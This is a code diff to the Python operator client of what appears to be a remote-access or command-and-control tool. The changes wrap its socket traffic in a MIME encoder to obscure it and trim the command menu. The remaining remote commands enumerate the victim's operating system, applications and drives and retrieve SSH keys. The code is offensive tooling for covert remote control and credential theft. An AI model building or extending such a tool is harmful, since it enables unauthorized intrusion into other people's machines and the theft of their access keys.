@@ -1,6 +1,8 @@
 import socket
 import sys
 
+from crispy.encoders.mime import Mime
+
 BUFFER_SIZE = 1024
 TCP_IP, TCP_PORT = "localhost", 8080
 PROMPT = "%s:%i>> " % (TCP_IP, TCP_PORT)
@@ -19,13 +21,9 @@ BANNER = "      ___           ___                       ___           ___      \
 def help_menu():
     info = "\nRemote commands:\n"
     info += "\tenum_os            - get operating system info\n"
-    info += "\tenum_interfaces    - get a list of interfaces\n"
     info += "\tenum_applications  - get a list of installed applications\n"
     info += "\tenum_drives        - get a list of drives\n"
     info += "\tenum_printers      - get a list of printers\n"
-    info += "\tenum_usb           - get a list of USBs\n"
-    info += "\tget_reboot_history - get the system reboot history\n"
-    info += "\tget_process_list   - get the system process list\n"
     info += "\tget_ssh_keys       - get any ssh keys\n"
     info += "Local commands:\n"
     info += "\tsession            - show current session\n"
@@ -39,6 +37,7 @@ def get_session_info():
     return "need to implement once bind/reverse conn is figured out"
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+cipher = Mime()
 
 try:
     sock.connect((TCP_IP, TCP_PORT))
@@ -58,8 +57,8 @@ try:
             sock.close()
             break
         else:
-            sock.sendall(commandToExecute + "\n")
-            data = sock.recv(BUFFER_SIZE)
+            sock.sendall(cipher.encode(commandToExecute + "\n"))
+            data = cipher.decode(sock.recv(BUFFER_SIZE))
             print data
 except:
     print "Couldn't connect to " + TCP_IP
